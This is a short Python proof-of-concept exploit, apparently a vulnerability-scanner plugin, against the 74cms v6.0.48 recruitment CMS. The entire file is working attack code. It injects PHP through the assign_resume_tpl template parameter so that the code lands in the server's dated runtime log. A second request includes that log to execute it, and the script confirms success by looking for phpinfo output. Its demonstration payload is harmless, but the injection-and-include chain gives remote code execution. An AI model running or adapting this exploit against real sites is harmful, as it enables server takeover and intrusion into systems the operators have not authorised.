# coding: utf-8
import requests
import datetime
from os import path

#74cms v6.0.48 - 模版注入+文件包含getshell
def poc(url,user_agent,proxy):

    url = url.strip("/")
    exp_url = url  + "/index.php?m=home&a=assign_resume_tpl"
    v_url=url+"/index.php?m=home&a=assign_resume_tpl"
    header = {'User-Agent': user_agent}

    data1={
        'variable':1,
        'tpl':'<?php phpinfo(); ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET["id"]"/>'
    }
    mounth=datetime.date.today().month
    if mounth<10:
        m='0'+str(datetime.date.today().month)
    else:
        m=str(datetime.date.today().month)
    data2={
        'variable': 1,
        'tpl':'data/Runtime/Logs/Home/'+str(datetime.date.today().year)[2:]+'_'+m+'_'+str(datetime.date.today().day)+'.log'
    }
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response1 = requests.post(exp_url, headers=header,data=data1, proxies=proxies)
        response2 = requests.post(v_url, headers=header,data=data2, proxies=proxies)


    else:
        response1 = requests.post(exp_url, headers=header,data=data1)
        response2 = requests.post(v_url, headers=header,data=data2)


    if 'PHP Version' in response2.text:
        return '74cms v6.0.48 - 模版注入+文件包含getshell'


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

